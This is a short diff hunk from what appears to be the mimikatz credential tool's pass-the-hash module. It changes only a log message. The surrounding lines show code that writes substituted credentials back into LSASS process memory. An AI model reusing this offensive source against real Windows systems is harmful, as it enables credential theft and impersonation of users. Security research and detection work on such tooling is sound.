@@ -51,7 +51,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKIWI_MSV1_0_PRIMARY
 		RtlCopyMemory((PBYTE) pPrimaryCreds + (ULONG_PTR) pPrimaryCreds->LogonDomainName.Buffer, pthDataCred->pthData->LogonDomain, pPrimaryCreds->LogonDomainName.Length);
 		(*pthDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(pPrimaryCreds, pCredentials->Credentials.Length);
 
-		kprintf(L"Data copy @ %p : ", origBufferAddress->address);
+		kprintf(L"Data copy MSV1_0   @ %p : ", origBufferAddress->address);
 		if(pthDataCred->pthData->isReplaceOk = kull_m_memory_copy(origBufferAddress, &aLocalMemory, pCredentials->Credentials.Length))
 			kprintf(L"OK !");
 		else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
